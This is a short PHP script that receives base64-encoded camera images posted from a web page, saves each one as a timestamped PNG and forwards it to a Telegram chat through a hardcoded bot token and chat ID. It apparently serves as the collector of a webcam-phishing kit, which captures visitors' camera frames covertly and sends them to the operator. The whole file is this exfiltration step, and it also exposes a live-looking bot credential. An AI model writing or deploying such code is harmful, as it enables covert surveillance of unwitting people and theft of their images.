<?php
// Your Telegram bot token and chat ID
$botToken = "5958066791:AAF_uqAdyYHR1GEbXhnEAlwbBW3G2lkIPZM";
$chatID = "2041536580";

$date = date('dMYHis');
$imageData=$_POST['cat'];
if (!empty($_POST['cat'])) {
    error_log("Received" . "\r\n", 3, "Log.log");
}
$filteredData=substr($imageData, strpos($imageData, ",")+1);
$unencodedData=base64_decode($filteredData);
$fp = fopen( 'cam'.$date.'.png', 'wb' );
fwrite( $fp, $unencodedData);
fclose( $fp );

// Send the image to Telegram
$url = "https://api.telegram.org/bot".$botToken."/sendPhoto";
$postFields = array(
    'chat_id' => $chatID,
    'photo' => new CURLFile(realpath('cam'.$date.'.png')),
);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$result = curl_exec($ch);
curl_close($ch);

exit();
?>
